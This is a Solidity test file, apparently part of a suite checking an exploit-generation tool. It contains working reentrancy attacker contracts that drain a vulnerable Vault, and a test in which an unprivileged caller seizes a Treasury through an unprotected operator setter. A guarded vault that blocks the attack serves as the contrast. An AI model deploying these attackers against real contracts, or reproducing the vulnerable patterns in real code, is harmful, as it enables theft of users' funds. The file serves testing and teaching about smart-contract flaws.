// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../script/ChainProofScript.sol";
import {GuardedVault} from "../src/GuardedVault.sol";
import {Treasury} from "../src/Treasury.sol";
import {Vault} from "../src/Vault.sol";

/// @notice Attacker used by the self-check suite. The generated PoC in
///         src/Execution/ExploitTemplateRenderer.php follows the same shape.
contract ReentrantVaultAttacker {
    Vault private immutable vault;

    constructor(address vaultAddress) {
        vault = Vault(vaultAddress);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

contract ReentrantGuardedAttacker {
    GuardedVault private immutable vault;

    constructor(address vaultAddress) {
        vault = GuardedVault(vaultAddress);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdraw();
        }
    }
}

contract VaultTest is ChainProofTest {
    Vault private vault;

    function setUp() public {
        vault = new Vault();
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 3 ether}();
    }

    receive() external payable {}

    function testDepositAndWithdraw() public {
        vault.withdraw();

        assertEq(address(vault).balance, 0, "vault should be empty after a normal withdraw");
        assertEq(vault.balances(address(this)), 0, "balance entry should be zeroed");
    }

    function testReentrancyDrainsVault() public {
        ReentrantVaultAttacker attacker = new ReentrantVaultAttacker(address(vault));
        uint256 vaultBefore = address(vault).balance;

        attacker.attack{value: 1 ether}();

        assertEq(address(vault).balance, 0, "vault should be drained");
        assertEq(address(attacker).balance, vaultBefore + 1 ether, "attacker keeps the drained ETH");
    }
}

contract TreasuryTest is ChainProofTest {
    receive() external payable {}

    function testOperatorCanSweep() public {
        Treasury treasury = new Treasury();
        vm.deal(address(treasury), 5 ether);
        uint256 balanceBefore = address(this).balance;

        treasury.setOperator(address(this));
        treasury.emergencyWithdraw(payable(address(this)));

        assertEq(address(treasury).balance, 0, "treasury swept");
        assertEq(address(this).balance, balanceBefore + 5 ether, "test contract received the funds");
    }

    function testAnyoneCanBecomeOperator() public {
        Treasury treasury = new Treasury();
        vm.deal(address(treasury), 5 ether);
        address attacker = address(0xBEEF);

        treasury.setOperator(attacker);
        assertEq(treasury.operator(), attacker, "operator overwritten by an unprivileged caller");

        vm.prank(attacker);
        treasury.emergencyWithdraw(payable(attacker));

        assertEq(address(treasury).balance, 0, "treasury drained");
        assertEq(attacker.balance, 5 ether, "attacker received the treasury");
    }
}

contract GuardedVaultTest is ChainProofTest {
    GuardedVault private vault;

    function setUp() public {
        vault = new GuardedVault();
        vm.deal(address(this), 10 ether);
        vault.deposit{value: 3 ether}();
    }

    receive() external payable {}

    function testNonReentrantBlocksAttack() public {
        ReentrantGuardedAttacker attacker = new ReentrantGuardedAttacker(address(vault));

        vm.expectRevert();
        attacker.attack{value: 1 ether}();
    }

    function testNormalWithdrawStillWorks() public {
        vault.withdraw();

        assertEq(address(vault).balance, 0, "vault empty after a normal withdraw");
    }
}
